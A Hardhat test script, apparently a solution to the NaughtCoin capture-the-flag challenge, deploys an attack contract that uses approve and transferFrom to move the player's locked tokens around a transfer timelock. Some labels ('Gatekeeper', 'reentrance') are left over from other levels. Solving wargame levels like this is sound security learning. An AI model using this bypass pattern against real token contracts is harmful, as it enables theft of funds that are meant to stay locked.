import { expect } from "chai";
import { Attack, NaughtCoin } from "../typechain-types";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";

describe("Gatekeeper exploit using contract attack", function () {
  let attackerContract: Attack,
    naughtCoinContractAddress: string,
    naughtCoinContract: NaughtCoin,
    attacker: SignerWithAddress,
    totalSupply: BigNumber,
    balanceOfAttacker: BigNumber,
    balanceOfAttackerContract: BigNumber;
  //Exploit takes place in deployment
  before("Setup for attack locally", async function () {
    [attacker] = await ethers.getSigners();

    naughtCoinContractAddress = "0xfc30405Df84BdAf5F4d97f5B410052c806DE5342";

    naughtCoinContract = await ethers.getContractAt(
      "NaughtCoin",
      naughtCoinContractAddress
    );

    const attackerContractFactory = await ethers.getContractFactory("Attack");

    attackerContract = await attackerContractFactory.deploy(
      naughtCoinContract.address
    );

    await attackerContract.deployed();
  });

  it("perform exploit", async function () {
    // Check total supply, should equal initial supply because of minting

    totalSupply = await naughtCoinContract.totalSupply();

    console.log("The total supply of naughtcoin is: ", totalSupply);

    // check the initial balance of the player address - should = initial supply
    let initialBalanceOfAttacker = await naughtCoinContract.balanceOf(
      attacker.address
    );

    console.log(
      "The initial balance of the naughtcoin player/attacker address is: ",
      initialBalanceOfAttacker
    );

    // check the initial balance of the attack contract address - should = 0

    let initialBalanceOfAttackerContract = await naughtCoinContract.balanceOf(
      attackerContract.address
    );

    console.log(
      "The initial naughtcoin balance of the attacker contract  is: ",
      initialBalanceOfAttackerContract
    );

    // check allowance of deployed contract

    let initialAllowance = await naughtCoinContract.allowance(
      attacker.address,
      attackerContract.address
    );

    console.log(
      "The inital allowance of the attack contract is",
      initialAllowance
    );

    // grant the attack contract the approval to spend all tokens

    let txGrantApproval = await naughtCoinContract.approve(
      attackerContract.address,
      totalSupply
    );

    await txGrantApproval.wait();
    // check allowance after approval
    let newAllowance = await naughtCoinContract.allowance(
      attacker.address,
      attackerContract.address
    );

    console.log("The new allowance of the attack contract is", newAllowance);

    // initiate the transferFrom call so that the attack contract can transfer balance on users behalf

    let txWithdrawWithContract =
      await attackerContract.contractWithdrawTokens();

    await txWithdrawWithContract.wait();

    balanceOfAttacker = await naughtCoinContract.balanceOf(attacker.address);

    console.log(
      "The final balance of the attacker/player address is",
      balanceOfAttacker
    );

    balanceOfAttackerContract = await naughtCoinContract.balanceOf(
      attackerContract.address
    );

    console.log(
      "The final balance of the attacker contract address is",
      balanceOfAttackerContract
    );
  });

  after("confirm exploit", async function () {
    // check that the reentrance contract == 0
    expect(balanceOfAttacker).to.be.eq(0);
    expect(balanceOfAttackerContract).to.be.gte(totalSupply);
  });
});
